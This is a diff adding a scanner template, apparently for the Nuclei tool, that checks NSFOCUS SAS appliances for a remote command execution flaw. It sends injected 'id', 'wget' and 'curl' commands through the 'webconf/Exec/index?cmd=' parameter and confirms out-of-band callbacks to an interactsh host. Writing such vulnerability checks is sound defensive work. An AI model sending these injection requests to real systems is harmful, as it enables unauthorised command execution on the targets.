@@ -1,0 +1,39 @@
+id: nsfocus-sas-exec-cmd
+info:
+  name: 绿盟 SAS Exec 接口 - 远程命令执行漏洞
+  author: Chaitin
+  severity: high
+  metadata:
+    verified: true
+    max-request: 3
+    vendor: nsfocus
+    product: sas
+  tags: rce,vuln,nsfocus,sas
+variables:
+  reverseURL: http://{{interactsh-url}}
+flow: http(1) || http(2) || http(3)
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/webconf/Exec/index?cmd=id'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(to_lower(body), to_lower("WEBSVC OK"))'
+  - method: GET
+    path:
+      - '{{BaseURL}}/webconf/Exec/index?cmd=wget%20{{reverseURL}}'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(interactsh_protocol, "dns") || contains(interactsh_protocol, "http")'
+  - method: GET
+    path:
+      - '{{BaseURL}}/webconf/Exec/index?cmd=curl%20{{reverseURL}}'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(interactsh_protocol, "dns") || contains(interactsh_protocol, "http")'
